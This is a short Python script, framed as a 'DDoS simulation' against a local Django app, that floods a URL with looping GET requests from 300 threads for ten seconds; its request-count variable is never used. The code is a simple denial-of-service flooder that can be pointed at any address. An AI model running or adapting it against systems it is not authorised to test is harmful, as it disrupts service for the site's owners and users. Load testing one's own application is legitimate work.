import requests
import threading
import time

# Target URL
url = "http://127.0.0.1:8000"  # Change to your Django app URL

# Number of requests
num_requests = 10000  # Change to the desired number of requests
threads = 300  # Number of concurrent threads

def send_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent, response code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

def start_attack():
    for _ in range(threads):
        t = threading.Thread(target=send_request)
        t.daemon = True  # Daemonize thread
        t.start()

if __name__ == "__main__":
    print(f"Starting DDoS simulation on {url}...")
    start_attack()
    # Run the attack for a specified time
    time.sleep(10)  # Change the duration as needed
    print("Simulation finished.")
